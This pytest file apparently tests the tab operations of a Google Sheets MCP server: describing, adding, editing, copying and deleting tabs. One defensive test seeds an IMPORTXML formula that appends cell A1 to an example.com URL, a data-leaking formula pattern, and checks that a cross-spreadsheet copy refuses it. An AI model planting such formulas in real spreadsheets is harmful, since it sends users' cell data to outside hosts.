import pytest
from sheets_mcp import a1, tabs, values
from sheets_mcp.values import RangeValues


def tab_titles(fake, book):
    return [tab['properties']['title'] for tab in fake.files[book]['tabs']]


def test_describe_counts_positions_from_one(fake, clients):
    """Verify describe_spreadsheet numbers tab positions from 1 in tab
    order and reports each grid size.

    Mutation: passing the API's 0-based index through as position.
    Oracle: two seeded tabs, so positions 1 and 2.
    """
    book = fake.add_spreadsheet('Book', {'Data': [['a']], 'Notes': []})
    described = tabs.describe_spreadsheet(clients, book)
    assert described['title'] == 'Book'
    assert [(tab['title'], tab['position'], tab['rows']) for tab in described['tabs']] == [
        ('Data', 1, 1000), ('Notes', 2, 1000)]


def test_describe_named_ranges_parse(fake, clients):
    """Verify each named range renders as A1 text parse_range accepts,
    with an omitted start index read as row or column 1.

    Mutation: an omitted start index left as None, which renders
    'Data'!:F10 for a range from A1; or a bare sheetId given cell bounds.
    Oracle: hand-written A1 text for four JSON shapes the API returns.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    sheet_id = fake.files[book]['tabs'][0]['properties']['sheetId']
    fake.files[book]['namedRanges'] = [
        {'name': 'Block', 'range': {
            'sheetId': sheet_id, 'endRowIndex': 10, 'endColumnIndex': 6}},
        {'name': 'Column', 'range': {
            'sheetId': sheet_id, 'startColumnIndex': 5, 'endColumnIndex': 6}},
        {'name': 'Rows', 'range': {
            'sheetId': sheet_id, 'startRowIndex': 2, 'endRowIndex': 5}},
        {'name': 'Tab', 'range': {'sheetId': sheet_id}},
        ]
    described = tabs.describe_spreadsheet(clients, book)
    rendered = [named['range'] for named in described['named_ranges']]
    assert rendered == ["'Data'!A1:F10", "'Data'!F:F", "'Data'!3:5", "'Data'"]
    for text in rendered:
        a1.parse_range(text)


def test_describe_named_range_open_end_takes_grid_edge(fake, clients):
    """Verify an open end A1 cannot write renders at the grid edge, and an
    open row end beside bounded columns stays open.

    Mutation: leaving an open end as None, which renders 'Data'!3: and
    parses as row 3 alone; or filling every open row end, which turns
    'Data'!A2:F into 'Data'!A2:F1000.
    Oracle: the fake's 1000-row, 26-column grid, so row 1000 and column Z.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    sheet_id = fake.files[book]['tabs'][0]['properties']['sheetId']
    fake.files[book]['namedRanges'] = [
        {'name': 'FromRow', 'range': {'sheetId': sheet_id, 'startRowIndex': 2}},
        {'name': 'FromColumn', 'range': {'sheetId': sheet_id, 'startColumnIndex': 2}},
        {'name': 'FromCell', 'range': {
            'sheetId': sheet_id, 'startRowIndex': 4, 'startColumnIndex': 2}},
        {'name': 'OpenRows', 'range': {
            'sheetId': sheet_id, 'startRowIndex': 1, 'endColumnIndex': 6}},
        ]
    described = tabs.describe_spreadsheet(clients, book)
    rendered = [named['range'] for named in described['named_ranges']]
    assert rendered == ["'Data'!3:1000", "'Data'!C:Z", "'Data'!C5:Z", "'Data'!A2:F"]
    assert a1.parse_range(rendered[0]) == a1.CellRange(
        tab='Data', first_row=3, last_row=1000)


def test_add_tab_at_position(fake, clients):
    """Verify position 1 adds the tab first.

    Mutation: sending position unchanged as the 0-based index, which puts
    the tab second.
    Oracle: tab order after the call.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    assert tabs.add_tab(clients, book, 'Intro', position=1) == {
        'title': 'Intro', 'position': 1}
    assert tab_titles(fake, book) == ['Intro', 'Data']


def test_edit_tab_changes_only_given_properties(fake, clients):
    """Verify edit_tab's field mask names only the options given, so a
    hidden tab stays hidden through a rename and a freeze.

    Mutation: a mask that always includes 'hidden', which resets it to
    visible.
    Oracle: the fake honors the field mask as the API does.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'Other': []})
    tabs.edit_tab(clients, book, 'Data', hidden=True)
    answer = tabs.edit_tab(clients, book, 'Data', title='Raw', frozen_rows=1)
    assert answer == {'title': 'Raw', 'changed': ['title', 'frozen_rows']}
    properties = fake.files[book]['tabs'][0]['properties']
    assert properties['title'] == 'Raw'
    assert properties['hidden'] is True
    assert properties['gridProperties']['frozenRowCount'] == 1


def test_edit_tab_empty_color_clears(fake, clients):
    """Verify color '' sends the color field with no value, which clears it.

    Mutation: treating '' like None and sending nothing.
    Oracle: the recorded request's mask and properties.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    tabs.edit_tab(clients, book, 'Data', color='#1A73E8')
    tabs.edit_tab(clients, book, 'Data', color='')
    cleared = fake.requests[-1]['updateSheetProperties']
    assert cleared['fields'] == 'tabColorStyle'
    assert 'tabColorStyle' not in cleared['properties']


def test_edit_tab_needs_a_change(fake, clients):
    """Verify edit_tab with no option is refused before calling Google.

    Mutation: sending an update with an empty field mask.
    Oracle: no request is recorded.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    with pytest.raises(ValueError):
        tabs.edit_tab(clients, book, 'Data')
    assert fake.requests == []


def test_copy_tab_in_place_and_across(fake, clients):
    """Verify copy_tab duplicates in place under a new title, and copies
    into another spreadsheet and renames the copy there.

    Mutation: renaming the copy in the source spreadsheet, or ignoring
    title on the in-place copy.
    Oracle: titles and cells of both spreadsheets after the calls.
    """
    book = fake.add_spreadsheet('Book', {'Template': [['x', 1]]})
    other = fake.add_spreadsheet('Other', {'Sheet1': []})
    assert tabs.copy_tab(clients, book, 'Template', title='March') == {
        'spreadsheet_id': book, 'title': 'March'}
    assert tabs.copy_tab(clients, book, 'Template', other, title='April') == {
        'spreadsheet_id': other, 'title': 'April'}
    assert tab_titles(fake, book) == ['Template', 'March']
    assert tab_titles(fake, other) == ['Sheet1', 'April']
    assert fake.cells(other, 'April') == [['x', 1]]


def test_delete_tab_and_unknown_tab_message(fake, clients):
    """Verify delete_tab removes the tab, and an unknown title is refused
    with the real titles listed.

    Mutation: tab_properties matching titles without case, or the error
    leaving out the tab list the caller needs to retry.
    Oracle: the seeded titles.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'Scratch': []})
    tabs.delete_tab(clients, book, 'Scratch')
    assert tab_titles(fake, book) == ['Data']
    with pytest.raises(ValueError, match=r"no tab 'data'; the tabs are \['Data'\]"):
        tabs.delete_tab(clients, book, 'data')


def test_edit_tab_moves_right_to_the_position_asked(fake, clients):
    """Verify position 2 moves the first tab to second place.

    Mutation: sending position - 1 when moving right, which the API reads
    before the move and leaves the tab first.
    Oracle: the fake counts the index before the move, as the API does.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'S2': [], 'S3': []})
    tabs.edit_tab(clients, book, 'Data', position=2)
    assert tab_titles(fake, book) == ['S2', 'Data', 'S3']


def test_copy_tab_across_refuses_url_formula(fake, clients):
    """Verify a tab with a URL-fetching formula is not copied into another
    spreadsheet, and nothing lands there.

    Mutation: skipping the formula scan on a cross-spreadsheet copy.
    Oracle: the destination's tab list after the refusal.
    """
    source = fake.add_spreadsheet(
        'Source', {'T': [['=IMPORTXML("https://example.com/?"&A1, "//a")']]})
    target = fake.add_spreadsheet('Target', {'Sheet1': []})
    with pytest.raises(ValueError, match='IMPORTXML'):
        tabs.copy_tab(clients, source, 'T', target)
    assert tab_titles(fake, target) == ['Sheet1']


def test_copy_tab_across_copies_text_that_looks_like_a_url_formula(fake, clients):
    """Verify text cells that start like a URL-fetching formula do not stop a
    copy into another spreadsheet.

    Mutation: the scan reading values.get FORMULA, which returns a text cell
      as its bare string, so '=IMAGE(...)' stored as text and
      '- IMAGE (see logo)' read as formulas.
    Oracle: a live Sheet, where a RAW '=IMAGE(...)' and '- IMAGE (see logo)'
      came back as stringValue and only '=1+1' as formulaValue.
    """
    source = fake.add_spreadsheet('Source', {'T': [['=1+1']]})
    values.write_ranges(clients, source, [RangeValues(
        range='T!A2', values=[['=IMAGE("https://example.com/logo.png")'],
                              ['- IMAGE (see logo)']])], parse=False)
    target = fake.add_spreadsheet('Target', {'Sheet1': []})
    assert tabs.copy_tab(clients, source, 'T', target, title='Copy') == {
        'spreadsheet_id': target, 'title': 'Copy'}
    assert fake.cells(target, 'Copy')[1] == ['=IMAGE("https://example.com/logo.png")']


def test_built_requests_name_a_tab_added_in_the_same_batch(fake, clients):
    """Verify add_tab_request's sheet_id lets later requests in one
    batchUpdate freeze and move the tab it adds.

    Mutation: sheet_id left out of the addSheet properties, so Sheets picks
      another id and the later requests miss the tab; or tab_update_request
      computing the index without the current index it is given.
    Oracle: tab order and frozen rows after one hand-built batch.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'Notes': []})
    added = {'sheetId': 7, 'index': 2}
    freeze, _ = tabs.tab_update_request(added, frozen_rows=2)
    move, changed = tabs.tab_update_request(added, position=1)
    requests = [tabs.add_tab_request('New', sheet_id=7), freeze, move]
    clients.sheets.spreadsheets().batchUpdate(
        spreadsheetId=book, body={'requests': requests}).execute()
    assert changed == ['position']
    assert tab_titles(fake, book) == ['New', 'Data', 'Notes']
    properties = fake.files[book]['tabs'][0]['properties']
    assert properties['sheetId'] == 7
    assert properties['gridProperties']['frozenRowCount'] == 2


def test_add_tab_request_hides_only_when_asked(fake, clients):
    """Verify add_tab_request with hidden=True adds a hidden tab, and one
    without it stays visible.

    Mutation: dropping the hidden key from the request, or setting it on
    every tab.
    Oracle: the fake stores hidden as the request sends it.
    """
    book = fake.add_spreadsheet('Book')
    requests = [
        tabs.add_tab_request('Scratch', hidden=True),
        tabs.add_tab_request('Shown'),
        ]
    clients.sheets.spreadsheets().batchUpdate(
        spreadsheetId=book, body={'requests': requests}).execute()
    hidden_by_title = {
        tab['properties']['title']: tab['properties']['hidden']
        for tab in fake.files[book]['tabs']
        }
    assert hidden_by_title['Scratch'] is True
    assert hidden_by_title['Shown'] is False
